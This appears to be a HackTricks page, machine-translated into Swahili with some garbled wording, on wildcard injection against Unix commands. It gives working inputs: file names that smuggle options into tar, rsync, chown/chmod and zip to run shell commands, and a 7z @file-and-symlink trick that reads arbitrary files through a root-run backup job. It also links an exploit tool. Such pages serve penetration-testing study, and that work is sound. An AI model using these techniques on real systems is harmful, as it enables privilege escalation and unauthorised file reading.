{{#include ../../banners/hacktricks-training.md}}

## chown, chmod

Unaweza **kuonyesha mmiliki wa faili na ruhusa unazotaka nakala kwa faili zingine**
```bash
touch "--reference=/my/own/path/filename"
```
You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(combined attack)_\
More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Teua amri za kiholela:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Unaweza kutumia hii kwa kutumia [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(shambulio la tar)_\
Maelezo zaidi katika [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Tekeleza amri zisizo na mipaka:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Unaweza kutumia hii kwa kutumia [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_\
Maelezo zaidi katika [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

Katika **7z** hata kutumia `--` kabla ya `*` (kumbuka kwamba `--` inamaanisha kwamba ingizo linalofuata haliwezi kut treated kama vigezo, hivyo ni njia za faili tu katika kesi hii) unaweza kusababisha kosa la kiholela kusoma faili, hivyo ikiwa amri kama ifuatayo inatekelezwa na root:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Na unaweza kuunda faili katika folda ambapo hii inatekelezwa, unaweza kuunda faili `@root.txt` na faili `root.txt` ikiwa ni **symlink** kwa faili unayotaka kusoma:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Kisha, wakati **7z** inatekelezwa, itachukulia `root.txt` kama faili inayoshikilia orodha ya faili ambazo inapaswa kubana (hiyo ndiyo maana ya kuwepo kwa `@root.txt`) na wakati 7z inasoma `root.txt` itasoma `/file/you/want/to/read` na **kwa sababu maudhui ya faili hii si orodha ya faili, itatupa kosa** ikionyesha maudhui.

_Maelezo zaidi katika Write-ups ya sanduku la CTF kutoka HackTheBox._

## Zip

**Tekeleza amri zisizo na mipaka:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{{#include ../../banners/hacktricks-training.md}}
